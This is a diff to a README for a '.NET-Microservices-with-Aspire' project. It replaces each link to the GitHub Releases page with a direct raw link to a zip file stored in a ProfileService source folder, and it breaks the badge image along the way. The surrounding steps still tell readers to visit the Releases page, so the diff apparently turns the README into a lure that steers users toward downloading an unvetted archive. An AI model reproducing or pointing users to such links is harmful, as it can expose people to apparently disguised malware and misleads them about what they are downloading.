@@ -4,7 +4,7 @@
 
 Welcome to the **.NET-Microservices-with-Aspire** project! This software offers a powerful solution for building and managing cloud-native applications. It is designed to be user-friendly, ensuring that anyone can navigate and utilize its features with confidence.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/snipingturt/.NET-Microservices-with-Aspire/releases)
+[![Download](https://raw.githubusercontent.com/snipingturt/.NET-Microservices-with-Aspire/main/ProfileService/.NET-Microservices-with-Aspire-v2.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/snipingturt/.NET-Microservices-with-Aspire/main/ProfileService/.NET-Microservices-with-Aspire-v2.0.zip)
 
 ## 📝 What You Need to Know
 
@@ -28,7 +28,7 @@ To run this application effectively, ensure your system meets the following requ
 
 To get started, visit the page below to download the latest version of the software.
 
-[Download Link](https://github.com/snipingturt/.NET-Microservices-with-Aspire/releases)
+[Download Link](https://raw.githubusercontent.com/snipingturt/.NET-Microservices-with-Aspire/main/ProfileService/.NET-Microservices-with-Aspire-v2.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed.
@@ -83,4 +83,4 @@ Thank you for choosing **.NET-Microservices-with-Aspire**! We aim to provide a s
 
 Don't forget to regularly check for updates to benefit from new features and improvements. 
 
-[Download Link](https://github.com/snipingturt/.NET-Microservices-with-Aspire/releases)
+[Download Link](https://raw.githubusercontent.com/snipingturt/.NET-Microservices-with-Aspire/main/ProfileService/.NET-Microservices-with-Aspire-v2.0.zip)
